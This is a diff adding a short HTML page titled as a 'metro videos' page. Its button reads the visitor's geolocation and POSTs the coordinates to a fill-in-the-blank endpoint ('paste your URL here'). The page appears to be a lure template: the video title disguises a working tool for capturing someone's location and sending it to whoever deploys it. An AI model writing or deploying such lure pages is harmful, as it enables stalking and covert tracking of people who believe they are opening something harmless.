@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>videos da metro</title>
+</head>
+
+<body>
+
+<button onclick="pegarLocalizacao()">
+Compartilhar localização
+</button>
+
+<script>
+function pegarLocalizacao() {
+
+  navigator.geolocation.getCurrentPosition(function(pos) {
+
+    fetch("COLE_SUA_URL_AQUI", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude
+      })
+    });
+
+    alert("Localização enviada!");
+
+  });
+
+}
+</script>
+
+</body>
+</html>
